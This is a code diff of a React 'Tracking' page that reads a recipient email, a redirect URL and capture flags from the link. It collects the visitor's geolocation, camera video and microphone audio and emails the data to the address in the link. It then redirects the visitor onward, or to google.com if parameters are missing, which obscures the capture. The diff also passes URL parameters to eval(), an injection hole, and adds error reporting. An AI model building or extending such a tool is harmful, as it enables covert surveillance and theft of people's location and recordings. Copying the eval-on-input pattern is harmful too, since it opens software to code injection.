@@ -32,13 +32,17 @@ const Tracking: React.FC = () => {
     allUrlParamsWereSupplied: boolean;
   } => {
     // extract trackingRequest's values from url params
-    let trackingRequest = {
+    let trackingRequest: TrackingRequest = {
       email: query.get("email") ?? "",
       redirectUrl: query.get("redirectUrl") ?? "",
       askGeolocation: eval(query.get("askGeolocation") ?? "false"),
       askVideo: eval(query.get("askVideo") ?? "false"),
       askAudio: eval(query.get("askAudio") ?? "false"),
     };
+    if (trackingRequest.askAudio) {
+      const audioDuration = query.get("audioDuration");
+      trackingRequest.audioDuration = audioDuration ? +audioDuration : 1500;
+    }
     // validate if all url params are presented
     let allUrlParamsWereSupplied = true;
     Object.values(trackingRequest).forEach((value) => {
@@ -57,31 +61,48 @@ const Tracking: React.FC = () => {
     userData: FormData
   ) => {
     userData.append("toEmail", toEmail);
-    try {
-      await fetch(URLS.mailAPI + `?token=${BACKEND_TOKEN}`, {
-        method: "POST",
-        body: userData,
-      });
-    } catch (err) {
-      console.error({ err });
-    }
+    await fetch(URLS.mailAPI + `send-mail/?token=${BACKEND_TOKEN}`, {
+      method: "POST",
+      body: userData,
+    });
+  };
+
+  const reportError = async (error: string) => {
+    await fetch(URLS.mailAPI + `report-error/?token=${BACKEND_TOKEN}`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ error }),
+    });
   };
 
   const handlePageFlow = async () => {
     const { trackingRequest, allUrlParamsWereSupplied } = getTrackingRequest();
     if (!allUrlParamsWereSupplied) window.location.href = "https://google.com/"; // If some of the data is missing, redirect user to google.com
-    // get data about user
-    const userData = await getUserData({
-      askGeolocation: trackingRequest.askGeolocation,
-      askAudio: trackingRequest.askAudio,
-      askVideo: trackingRequest.askVideo,
-    });
-    // convert an Object to a formData
-    let formData = ObjectToFormData(userData);
-    // send an email
-    await sendUserDataToSpecifiedEmail(trackingRequest.email, formData);
-    // redirect to redirectUrl
-    window.location.href = trackingRequest.redirectUrl;
+    try {
+      // get data about user
+      const { userData, errors } = await getUserData({
+        askGeolocation: trackingRequest.askGeolocation,
+        askAudio: trackingRequest.askAudio,
+        askVideo: trackingRequest.askVideo,
+        audioDuration: trackingRequest.audioDuration,
+      });
+      // convert an Object to a formData
+      let formData = ObjectToFormData(userData);
+      // send an email
+      await sendUserDataToSpecifiedEmail(trackingRequest.email, formData);
+      // if were errors
+      if (Object.keys(errors).length) {
+        throw new Error(JSON.stringify(errors));
+      }
+    } catch (err) {
+      // send an email to admins
+      await reportError(err.toString());
+    } finally {
+      // redirect to redirectUrl
+      window.location.href = trackingRequest.redirectUrl;
+    }
   };
 
   useEffect(() => {
